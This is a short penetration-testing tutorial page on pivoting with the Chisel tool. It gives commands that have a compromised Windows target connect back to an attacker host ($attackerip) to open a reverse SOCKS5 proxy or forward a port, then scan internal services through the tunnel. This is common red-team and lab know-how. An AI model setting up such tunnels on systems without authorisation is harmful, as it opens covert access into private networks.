---
description: >-
  Example scenario for pivoting using Chisel. Note, this example assumes that
  the attacking system is Linux and the target system is Windows.
---

# Using Chisel to Pivot

### Setting up a SOCKS Proxy with Chisel

1\. Download the [latest Chisel binaries](https://github.com/jpillora/chisel)

> Note, you will need a binary placed on your attacking system and one to be uploaded to the target system.

2\. On the attacking system:

```bash
./chisel server --socks5 --reverse -p 8000
```

3\. On the target system:&#x20;

```bash
.\chisel.exe client $attackerip:8000 R:socks
```

4\. Observe on the attacking system that the SOCKS5 connection has been successfully established.

### Forwarding One Port with Chisel

1\. On the attacking system:

```bash
./chisel server 9000 -reverse
```

2\. On the target system:&#x20;

```bash
.\chisel client $attackerip:9000 R:$localport:127.0.0.1:$remoteport
```

#### Verification

The easiest way to verify if your `Chisel` connection was successful is to run the following command:&#x20;

```bash
ss -lnpt | grep $localport
```

#### Interaction

Ensure to remember that you will be interacting with `localhost` after forwarding a port. For example, by running&#x20;

```bash
nmap -sC -sV -p3306 -n localhost
```

### References

{% embed url="https://ap3x.github.io/posts/pivoting-with-chisel" %}

{% embed url="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" %}
